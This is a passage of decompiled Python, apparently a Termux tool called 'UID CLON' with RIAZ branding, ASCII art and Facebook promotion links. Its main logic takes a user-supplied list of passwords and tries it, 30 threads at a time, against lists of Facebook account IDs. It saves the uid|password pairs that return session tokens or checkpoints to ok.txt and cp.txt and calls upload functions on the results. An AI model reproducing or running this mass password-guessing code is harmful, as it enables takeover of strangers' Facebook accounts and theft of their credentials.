# Decompile by Mardis (Tools By RIAZ- MALS)
# Time Succes decompile : 2025-02-27 03:45:46.252763
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/RIAZ.MIA.883"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/RIAZ.MIA.883")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> RIAZ MIA ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/RIAZ.MIA.883"])
...
RRRRRRRRRRRRRRRRR   IIIIIIIIII               AAA               ZZZZZZZZZZZZZZZZZZZ
R::::::::::::::::R  I::::::::I              A:::A              Z:::::::::::::::::Z
R::::::RRRRRR:::::R I::::::::I             A:::::A             Z:::::::::::::::::Z
RR:::::R     R:::::RII::::::II            A:::::::A            Z:::ZZZZZZZZ:::::Z 
  R::::R     R:::::R  I::::I             A:::::::::A           ZZZZZ     Z:::::Z  
  R::::R     R:::::R  I::::I            A:::::A:::::A                  Z:::::Z    
  R::::RRRRRR:::::R   I::::I           A:::::A A:::::A                Z:::::Z     
  R:::::::::::::RR    I::::I          A:::::A   A:::::A              Z:::::Z      
  R::::RRRRRR:::::R   I::::I         A:::::A     A:::::A            Z:::::Z       
  R::::R     R:::::R  I::::I        A:::::AAAAAAAAA:::::A          Z:::::Z        
  R::::R     R:::::R  I::::I       A:::::::::::::::::::::A        Z:::::Z         
  R::::R     R:::::R  I::::I      A:::::AAAAAAAAAAAAA:::::A    ZZZ:::::Z     ZZZZZ
RR:::::R     R:::::RII::::::II   A:::::A             A:::::A   Z::::::ZZZZZZZZ:::Z
R::::::R     R:::::RI::::::::I  A:::::A               A:::::A  Z:::::::::::::::::Z
R::::::R     R:::::RI::::::::I A:::::A                 A:::::A Z:::::::::::::::::Z
RRRRRRRR     RRRRRRRIIIIIIIIIIAAAAAAA                   AAAAAAAZZZZZZZZZZZZZZZZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
""")
		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s99"%(G,R,G,Y,G))
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR RIAZ  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:RIAZ ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [RIAZ] : \033[0;97m %s/%s -> \033[0;92m [RIAZ -OK:%s ]- \033[0;93m[RIAZ-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RIAZ-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[RIAZ-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RIAZ-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
